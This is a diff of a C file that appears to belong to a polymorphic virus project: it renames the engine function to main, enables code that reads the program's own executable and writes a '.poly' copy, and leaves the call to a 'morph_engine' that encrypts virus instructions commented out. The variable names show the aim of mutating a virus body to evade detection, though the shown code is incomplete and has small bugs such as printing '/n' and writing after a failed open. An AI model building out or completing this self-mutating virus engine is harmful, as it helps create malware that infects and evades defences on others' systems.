@@ -6,7 +6,7 @@
 #include <unistd.h>
 #include <bfd.h>
 
-extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
+// extern int morph_engine(char* exe_data, size_t virus_instruction_begin, size_t virus_encrypt_size, size_t virus_decrypt_offset);
 
 typedef struct node {
   const char* name;
@@ -66,7 +66,7 @@ char* getaddress(char *filename, char*symbol){
 	}
 }
 
-int polymorphicengine(int argc, char* argv[])
+int main(int argc, char* argv[])
 {
       // int i;
       // for (i=0; i<argc; ++i) {
@@ -104,66 +104,65 @@ int polymorphicengine(int argc, char* argv[])
       printf("%ul\n", virus_encrypt_size);
       printf("%ul\n", virus_decrypt_offset);
 
-      // // open the executable file
-	// FILE* exe_file = fopen(argv[0], "rb");
-	// if(!exe_file)
-	// {
-	// 	printf("Failed to open %s\n", argv[0]);
-	// 	return -1;
-	// }
+      // open the executable file
+	FILE* exe_file = fopen(argv[0], "rb");
+	if(!exe_file)
+	{
+		printf("Failed to open %s\n", argv[0]);
+		return -1;
+	}
 
-	// // get the size of the executable file
-	// size_t exe_size;
-	// fseek(exe_file, 0, SEEK_END);
-	// exe_size = ftell(exe_file);
-	// rewind(exe_file);
+	// get the size of the executable file
+	size_t exe_size;
+	fseek(exe_file, 0, SEEK_END);
+	exe_size = ftell(exe_file);
+	rewind(exe_file);
 
-	// // allocate the data
-	// char* exe_data = malloc(exe_size);
-	// if(!exe_data)
-	// {
-	// 	fclose(exe_file);
-	// 	printf("Executable data allocation failed\n");
-	// 	return 1;
-	// }
+	// allocate the data
+	char* exe_data = malloc(exe_size);
+	if(!exe_data)
+	{
+		fclose(exe_file);
+		printf("Executable data allocation failed\n");
+		return 1;
+	}
 
-	// // read the entire executable file
-	// if(!fread(exe_data, exe_size, 1, exe_file))
-	// {
-	// 	fclose(exe_file);
-	// 	printf("Executable file read failed\n");
-	// 	goto quit;
-	// }
+	// read the entire executable file
+	if(!fread(exe_data, exe_size, 1, exe_file))
+	{
+		fclose(exe_file);
+		printf("Executable file read failed\n");
+	}
 
-	// // close the file
-	// fclose(exe_file);
+	// close the file
+	fclose(exe_file);
 
 
 
 	// // call the polymorphic engine
-	// // if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
-	// // {
-	// // 	printf("An error occured in the polymorphic engine\n");
-	// // 	goto quit;
-	// // }
-
-	// // initialize the output filename
-	// char out_filename[FILENAME_MAX];
-	// snprintf(out_filename, FILENAME_MAX, "%s.poly", argv[0]);
-
-	// // open the output file
-	// FILE* out_file = fopen(out_filename, "wb");
-	// if(!out_file)
+	// if(morph_engine(exe_data, virus_instruction_begin, virus_encrypt_size, virus_decrypt_offset) != 0)
 	// {
-	// 	printf("failed to open %s\n", out_filename);
-	// 	goto quit;
+	// 	printf("An error occured in the polymorphic engine\n");
+
 	// }
 
-	// // write the modified executable data
-	// if(!fwrite(exe_data, exe_size, 1, out_file))
-	// {
-	// 	printf("failed to write into %s\n", out_filename);
-	// }
+	// initialize the output filename
+	char out_filename[FILENAME_MAX];
+	snprintf(out_filename, FILENAME_MAX, "%s.poly", argv[0]);
+      printf("/n");
+	// open the output file
+	FILE* out_file = fopen(out_filename, "wb");
+	if(!out_file)
+	{
+		printf("failed to open %s\n", out_filename);
+		// goto quit;
+	}
+
+	// write the modified executable data
+	if(!fwrite(exe_data, exe_size, 1, out_file))
+	{
+		printf("failed to write into %s\n", out_filename);
+	}
 
       // quit:
       //       free(exe_data);
